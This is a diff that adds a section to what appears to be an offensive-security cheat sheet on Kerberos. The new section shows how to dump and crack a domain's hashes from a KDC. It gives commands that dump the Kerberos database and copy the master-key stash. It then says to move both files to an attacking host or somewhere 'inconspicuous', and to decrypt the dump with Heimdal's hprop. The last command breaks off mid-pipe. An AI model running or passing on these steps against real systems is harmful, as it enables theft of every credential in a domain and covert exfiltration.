@@ -595,7 +595,20 @@ Kerbero-Authenticated Web Applications:
 		--application may alternatively require ntlm authentication
 		--Kerberos Authorization header will always begin with "YII"
 		--NTLM Authorization header will always begin with "TlRM"
-	
+
+Dump & Crack full hashes for domain from KDC on a domain-joined Unix host
+	--*not hprop utility only distributed in standard compiled format as component of pacakge Heimdal
+		--conflicts with MIT Kerberos distribution (only tested on Debian-based distributions)
+		--if heimdel is already installed and facilitating connection to domain & KDC instead use hprop to dump Kerberos in non-encrypted format, ezpz winz
+>On KDC
+sudo kdb5_util dump -b7 kdc.dump
+	-dump kerberos "encrypted" hashes store from KDC memory
+cp /etc/krb5/stash stash
+	-collect a copy of the pairwise master key
+--copy the kdc.dump and stash files created to the attacking host or wherever else may be most inconspicuous/convenient
+apt install heimdal-kdc -y
+hprop --database=kdc.dump --master-key=stash source=mit-dump --decrypt --stdout | 
+
 	
 	
 Glossary:
